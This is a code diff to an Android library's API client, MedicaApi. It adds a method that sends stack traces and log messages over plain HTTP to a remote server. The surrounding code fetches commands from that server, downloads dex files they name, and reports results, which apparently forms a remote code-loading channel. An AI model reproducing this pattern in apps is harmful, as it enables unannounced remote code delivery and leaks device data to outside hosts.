@@ -1,5 +1,6 @@
 package com.tunebrains.cpu.library
 
+import android.util.Log
 import com.google.gson.Gson
 import com.tunebrains.cpu.dexlibrary.CommandResult
 import com.tunebrains.cpu.library.cmd.LocalCommand
@@ -8,7 +9,6 @@ import io.reactivex.Completable
 import io.reactivex.Single
 import okhttp3.*
 import okhttp3.HttpUrl.Companion.toHttpUrl
-import timber.log.Timber
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
@@ -22,12 +22,41 @@ interface IMedicaApi {
     fun downloadFile(url: String, root: File): Single<File>
     fun downloadCommand(command: LocalCommand, cacheDir: File): Single<LocalCommand>
     fun reportCommand(it: LocalCommand, result: CommandResult): Completable
+    fun log(ex: Throwable?, mes: String)
 }
 
 open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaApi {
+    override fun log(ex: Throwable?, mes: String) {
+        val log = StringBuilder().apply {
+            ex?.let {
+                append(Log.getStackTraceString(it))
+            }
+            append(mes)
+        }.toString()
+        client.newCall(
+            Request.Builder()
+                .url(
+                    "$BASE_URL/API_SDK/apk_log".toHttpUrl().newBuilder()
+                        .addQueryParameter("log", log)
+                        .build()
+                )
+                .build()
+        ).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                e.printStackTrace()
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+
+            }
+
+        })
+    }
+
     companion object {
         const val BASE_URL = "http://api.magetic.com/c"
     }
+
     private val client = OkHttpClient.Builder().build()
     override fun ip(): Single<IPIinfo> {
         return Single.create<IPIinfo> { emitter ->
@@ -105,7 +134,7 @@ open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaA
     }
 
     override fun command(local: LocalCommand): Single<LocalCommand> {
-        Timber.d("Will fetch command from server $local")
+        Logger.d("Will fetch command from server $local")
         return Single.create { emitter ->
             client.newCall(Request.Builder().url("$BASE_URL/api_command?com_id=${local.serverId}").build())
                 .enqueue(object : Callback {
@@ -146,7 +175,7 @@ open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaA
     }
 
     override fun downloadFile(url: String, root: File): Single<File> {
-        Timber.d("Will download file from $url")
+        Logger.d("Will download file from $url")
 
         return Single.create { emitter ->
             client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
@@ -184,7 +213,7 @@ open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaA
     }
 
     override fun downloadCommand(command: LocalCommand, cacheDir: File): Single<LocalCommand> {
-        Timber.d("Will download command $command")
+        Logger.d("Will download command $command")
 
         return if (command.server != null) {
             downloadFile(command.server.dex, cacheDir).map {
@@ -196,7 +225,7 @@ open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaA
     }
 
     override fun reportCommand(it: LocalCommand, result: CommandResult): Completable {
-        Timber.d("Will report command $it")
+        Logger.d("Will report command $it")
         return Completable.create { emitter ->
             client.newCall(
                 Request.Builder().url(
